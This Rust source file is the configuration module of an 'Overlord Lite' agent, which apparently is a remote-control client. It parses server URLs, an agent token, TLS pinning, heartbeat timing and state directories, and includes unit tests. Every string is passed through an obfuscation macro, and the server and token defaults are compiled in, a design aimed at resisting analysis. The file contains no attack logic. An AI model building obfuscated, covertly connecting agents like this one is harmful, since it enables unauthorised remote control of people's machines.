use std::{env, fmt, path::PathBuf, time::Duration};

use anyhow::{Context, Result, bail};
use base64::{Engine as _, engine::general_purpose::STANDARD};
use tokio_tungstenite::tungstenite::http::Uri;

use crate::{obfstr, protocol};

#[derive(Clone, Debug)]
pub struct Config {
    pub servers: Vec<ServerUrl>,
    pub agent_token: Option<String>,
    pub build_tag: Option<String>,
    pub insecure_tls: bool,
    pub tls_spki_pins: Vec<[u8; 32]>,
    pub state_dir: PathBuf,
    pub reconnect_delay: Duration,
    pub heartbeat_interval: Duration,
}

#[derive(Clone, Debug, Eq, PartialEq)]
pub struct ServerUrl {
    normalized: String,
    scheme: String,
}

impl ServerUrl {
    pub fn parse(value: &str) -> Result<Self> {
        parse_server_url(value)
    }

    pub fn as_str(&self) -> &str {
        &self.normalized
    }

    pub fn scheme(&self) -> &str {
        &self.scheme
    }
}

impl fmt::Display for ServerUrl {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        formatter.write_str(&self.normalized)
    }
}

impl Config {
    pub fn from_env() -> Result<Self> {
        let raw_servers = env::var(obfstr!("OVERLORD_SERVER")).unwrap_or_else(|_| {
            let built_default = protocol::built_default_server();
            if built_default.is_empty() {
                obfstr!("wss://127.0.0.1:5173")
            } else {
                built_default
            }
        });
        let servers = raw_servers
            .split(',')
            .map(str::trim)
            .filter(|value| !value.is_empty())
            .map(parse_server_url)
            .collect::<Result<Vec<_>>>()?;
        if servers.is_empty() {
            bail!("OVERLORD_SERVER did not contain a server URL");
        }

        let insecure_tls = env_bool(&obfstr!("OVERLORD_TLS_INSECURE_SKIP_VERIFY"));
        let raw_tls_spki_pins = env::var(obfstr!("OVERLORD_TLS_SPKI_PINS"))
            .ok()
            .filter(|value| !value.trim().is_empty())
            .unwrap_or_else(protocol::built_default_tls_spki_pins);
        let tls_spki_pins = parse_tls_spki_pins(&raw_tls_spki_pins)?;
        if servers.iter().any(|url| url.scheme() == obfstr!("ws")) && !insecure_tls {
            bail!("plaintext ws:// requires OVERLORD_TLS_INSECURE_SKIP_VERIFY=true");
        }

        Ok(Self {
            servers,
            agent_token: env::var(obfstr!("OVERLORD_AGENT_TOKEN"))
                .ok()
                .or_else(|| Some(protocol::built_default_agent_token()))
                .filter(|value| !value.trim().is_empty()),
            build_tag: env::var(obfstr!("OVERLORD_BUILD_TAG"))
                .ok()
                .or_else(|| Some(protocol::built_default_build_tag()))
                .filter(|value| !value.trim().is_empty()),
            insecure_tls,
            tls_spki_pins,
            state_dir: env::var_os(obfstr!("OVERLORD_LITE_STATE_DIR"))
                .map(PathBuf::from)
                .unwrap_or_else(default_state_dir),
            reconnect_delay: env_duration(&obfstr!("OVERLORD_RECONNECT_DELAY_MS"), 5_000),
            heartbeat_interval: env_duration(&obfstr!("OVERLORD_PING_INTERVAL_MS"), 30_000),
        })
    }
}

fn parse_tls_spki_pins(value: &str) -> Result<Vec<[u8; 32]>> {
    value
        .split(',')
        .map(str::trim)
        .filter(|pin| !pin.is_empty())
        .map(|pin| {
            let prefix = obfstr!("sha256/");
            let encoded = pin.strip_prefix(&prefix).unwrap_or(pin);
            let decoded = STANDARD
                .decode(encoded)
                .with_context(|| format!("invalid TLS SPKI pin {pin:?}"))?;
            decoded
                .try_into()
                .map_err(|_| anyhow::anyhow!("invalid TLS SPKI pin {pin:?}: expected 32 bytes"))
        })
        .collect()
}

fn parse_server_url(value: &str) -> Result<ServerUrl> {
    let separator = obfstr!("://");
    let with_scheme = if value.contains(&separator) {
        value.to_owned()
    } else {
        let mut server = obfstr!("wss://");
        server.push_str(value);
        server
    };
    let without_fragment = with_scheme.split('#').next().unwrap_or(&with_scheme);
    let uri: Uri = without_fragment
        .parse()
        .with_context(|| format!("invalid server URL {value:?}"))?;
    let input_scheme = uri
        .scheme_str()
        .ok_or_else(|| anyhow::anyhow!("server URL is missing a scheme"))?;
    let scheme = if input_scheme == obfstr!("https") {
        obfstr!("wss")
    } else if input_scheme == obfstr!("http") {
        obfstr!("ws")
    } else if input_scheme == obfstr!("wss") || input_scheme == obfstr!("ws") {
        input_scheme.to_owned()
    } else {
        bail!("unsupported server URL scheme {input_scheme:?}");
    };
    let authority = uri
        .authority()
        .ok_or_else(|| anyhow::anyhow!("server URL is missing a host"))?;
    if authority.host().is_empty() || authority.as_str().contains('@') {
        bail!("server URL has an invalid host");
    }
    Ok(ServerUrl {
        normalized: format!("{scheme}://{authority}/"),
        scheme,
    })
}

fn env_bool(name: &str) -> bool {
    env::var(name)
        .map(|value| {
            let normalized = value.trim().to_ascii_lowercase();
            normalized == obfstr!("1")
                || normalized == obfstr!("true")
                || normalized == obfstr!("yes")
                || normalized == obfstr!("on")
        })
        .unwrap_or(false)
}

fn env_duration(name: &str, default_ms: u64) -> Duration {
    let ms = env::var(name)
        .ok()
        .and_then(|value| value.trim().parse::<u64>().ok())
        .unwrap_or(default_ms);
    Duration::from_millis(ms)
}

fn default_state_dir() -> PathBuf {
    #[cfg(target_os = "windows")]
    if let Some(root) = env::var_os(obfstr!("LOCALAPPDATA")) {
        return PathBuf::from(root)
            .join(obfstr!("Overlord"))
            .join(obfstr!("Lite"));
    }

    #[cfg(target_os = "macos")]
    if let Some(root) = env::var_os(obfstr!("HOME")) {
        return PathBuf::from(root)
            .join(obfstr!("Library"))
            .join(obfstr!("Application Support"))
            .join(obfstr!("Overlord Lite"));
    }

    if let Some(root) = env::var_os(obfstr!("XDG_STATE_HOME")) {
        return PathBuf::from(root).join(obfstr!("overlord-lite"));
    }
    if let Some(root) = env::var_os(obfstr!("HOME")) {
        return PathBuf::from(root)
            .join(obfstr!(".local"))
            .join(obfstr!("state"))
            .join(obfstr!("overlord-lite"));
    }
    PathBuf::from(obfstr!(".overlord-lite"))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn normalizes_server_urls() {
        assert_eq!(
            ServerUrl::parse("example.com:5173").unwrap().as_str(),
            "wss://example.com:5173/"
        );
        assert_eq!(
            ServerUrl::parse("https://example.com/base")
                .unwrap()
                .as_str(),
            "wss://example.com/"
        );
        assert_eq!(
            ServerUrl::parse("http://[::1]:5173/path?ignored=true#fragment")
                .unwrap()
                .as_str(),
            "ws://[::1]:5173/"
        );
        assert!(ServerUrl::parse("ftp://example.com").is_err());
        assert!(ServerUrl::parse("wss://user@example.com").is_err());
    }

    #[test]
    fn parses_prefixed_and_plain_spki_pins() {
        let encoded = STANDARD.encode([0x42; 32]);
        let pins = parse_tls_spki_pins(&format!("sha256/{encoded},{encoded}")).unwrap();
        assert_eq!(pins, vec![[0x42; 32], [0x42; 32]]);
        assert!(parse_tls_spki_pins("not-a-pin").is_err());
    }
}
